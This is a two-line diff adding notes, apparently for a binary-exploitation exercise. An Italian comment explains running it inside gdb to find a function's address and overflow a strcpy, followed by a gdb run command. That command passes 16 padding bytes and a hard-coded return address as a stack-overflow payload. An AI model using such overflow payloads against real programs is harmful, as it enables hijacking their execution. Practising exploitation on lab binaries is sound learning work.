@@ -1,0 +1,2 @@
+#per runnare da dentro gdb, trovare l'indirizzo della funzione e quando va in overflow la strcpy
+run $(perl -e 'print "A"x16,"\xb9\x61\x55\x56"')
